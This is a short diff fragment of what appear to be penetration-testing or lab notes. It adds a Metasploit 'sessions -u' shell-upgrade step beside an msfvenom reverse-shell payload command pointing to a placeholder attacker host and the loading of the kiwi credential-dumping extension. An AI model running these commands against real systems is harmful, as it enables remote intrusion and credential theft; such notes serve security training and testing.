@@ -34,3 +34,7 @@ msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shel
 
 load python
 load kiwi
+
+# upgrade shell
+
+sessions -u 3
